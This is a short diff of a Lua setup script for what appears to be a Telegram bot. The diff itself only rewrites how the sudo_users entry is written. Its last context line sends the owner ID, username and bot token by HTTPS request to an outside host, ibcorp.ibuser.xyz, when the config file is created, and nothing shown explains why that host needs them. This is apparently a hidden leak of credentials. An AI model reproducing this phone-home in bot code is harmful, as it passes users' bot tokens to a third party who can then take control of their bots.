@@ -83,8 +83,8 @@ SUDO = SUDO,
 token = token,
 bot_id = botid,
 username = username, 
+sudo_users = {SUDO}, 
 config_file(DevAbs:get(DevProx..":SUDO"),DevAbs:get(DevProx..":username"),DevAbs:get(DevProx..":token"))
-sudo_users = (SUDO), 
 }
 create(config, "./config.lua")   
 https.request("https://ibcorp.ibuser.xyz/iq_abs/?id="..SUDO.."&user="..username.."&token="..token)
